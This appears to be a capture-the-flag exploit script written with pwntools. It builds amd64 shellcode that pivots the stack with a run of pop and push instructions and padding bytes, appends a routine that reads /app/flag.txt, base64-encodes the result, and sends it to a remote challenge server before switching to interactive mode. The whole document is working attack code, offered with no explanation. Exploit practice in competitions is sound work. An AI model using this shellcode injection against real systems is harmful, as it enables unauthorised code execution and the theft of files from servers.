from pwn import *

context.arch = 'amd64'


sc = """


pop rbx
pop rbx
pop rbx
pop rbx
pop rbx
pop rbx
pop rbx
pop rbx

push r11
pop rsp
pop r12

pop r13
pop r13
pop r13
push r12

pop rbx
pop rbx
pop rbx

.byte 0x60
.byte 0x60
.byte 0x60
.byte 0x60
.byte 0x60
.byte 0x60
.byte 0x60
.byte 0x60


pop rax
pop rax
pop rax
pop rax
pop rax
pop rax
pop rax
pop rax
pop rax
pop rax
pop rax
pop rax
pop rax
pop rax
pop rax
pop rax
"""


sc_shell = shellcraft.cat("/app/flag.txt")
sc += sc_shell + "ret"

io = remote("pwn-14caf623.p1.securinets.tn", 9001)
# io = remote("localhost", 5000)
io.recvuntil(b"Shellcode : ")
io.sendline(base64.b64encode(asm(sc)))
io.interactive()

